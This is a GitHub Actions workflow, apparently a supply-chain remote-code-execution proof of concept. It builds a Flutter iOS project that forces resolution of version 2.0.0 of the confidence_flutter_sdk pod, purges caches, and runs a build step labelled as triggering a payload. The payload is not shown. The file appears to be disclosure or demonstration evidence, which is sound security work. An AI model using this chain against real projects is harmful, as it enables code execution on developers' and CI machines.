name: Supply Chain RCE Proof of Concept
on: [push, workflow_dispatch]

jobs:
  poc:
    runs-on: macos-latest
    steps:
      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          channel: 'stable'

      - name: Execute Full RCE Chain
        run: |
          # 1. Create dummy project
          flutter create rce_test
          cd rce_test
          flutter pub add confidence_flutter_sdk
          
          # 2. Patch Platform Version ke 16.0
          sed -i '' '1s/^/platform :ios, '"'"'16.0'"'"'\n/' ios/Podfile
          
          # 3. KILL Local Path & HARDCODE Version 2.0.0
          # Kita hapus baris otomatis Flutter dan PAKSA minta versi 2.0.0
          sed -i '' '/flutter_install_all_ios_pods/d' ios/Podfile
          echo "pod 'confidence_flutter_sdk', '2.0.0'" >> ios/Podfile
          
          echo "=== Podfile AFTER manual patch (Hardcoded 2.0.0) ==="
          cat ios/Podfile
          
          cd ios
          
          # === NUCLEAR CACHE KILLER ===
          echo "=== Purging CocoaPods Cache and Master Repo ==="
          pod cache clean --all
          rm -rf Pods
          rm -rf Podfile.lock
          
          # Paksa update repo secara verbose untuk bypass CDN latency
          pod repo update --verbose
          
          # 4. Pod Install - Resolution Phase
          # Jika 2.0.0 belum tersedia di CDN, ini akan ERROR (lebih baik daripada narik 1.2.4)
          pod install --verbose 2>&1 | tee pod_install.log || true
          
          echo "=== Check Podfile.lock Status ==="
          grep "confidence_flutter_sdk" Podfile.lock || echo "FAILED TO RESOLVE 2.0.0"
          
          cd ..
          # 5. Build Phase - Execution Phase (Trigger Payload)
          flutter build ios --no-codesign 2>&1 | tee build.log || true
          
          echo "=== Build log tail ==="
          tail -20 build.log

      - name: Upload Logs
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: poc-evidence
          path: |
            rce_test/ios/pod_install.log
            rce_test/ios/Podfile.lock
            rce_test/build.log
